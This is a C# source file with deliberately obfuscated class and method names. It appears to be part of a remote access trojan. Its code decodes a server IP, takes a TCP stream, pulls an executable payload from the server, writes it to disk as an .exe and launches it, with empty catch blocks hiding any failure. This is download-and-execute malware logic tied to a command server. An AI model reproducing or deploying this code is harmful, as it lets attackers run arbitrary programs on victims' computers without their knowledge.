using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace wardhmrias;

internal class OLRDMR
{
	public MLREDM server;

	public OLRDMR(MLREDM lID)
	{
		server = lID;
	}

	public NetworkStream wardhmriasNdS(TcpClient wardhmriastcpsck)
	{
		return wardhmriastcpsck.GetStream();
	}

	public string wardhmriasserverIPtD()
	{
		return Encoding.UTF8.GetString(DLAONIF.wardhmriasvptsips, 0, DLAONIF.wardhmriasvptsips.Length);
	}

	public void wardhmriasdo_prodess(string filetPath)
	{
		try
		{
			Process.Start(filetPath);
		}
		catch
		{
		}
	}

	public void wardhmriasremove_udser()
	{
		try
		{
			byte[] array = server.wardhmriaspull_dfata();
			if (array != null && !File.Exists(DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasremvdUser + ".exe"))
			{
				File.WriteAllBytes(DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasremvdUser + ".exe", array);
				wardhmriasdo_prodess(DLAONIF.wardhmriasget_mdpath() + DLAONIF.wardhmriasremvdUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
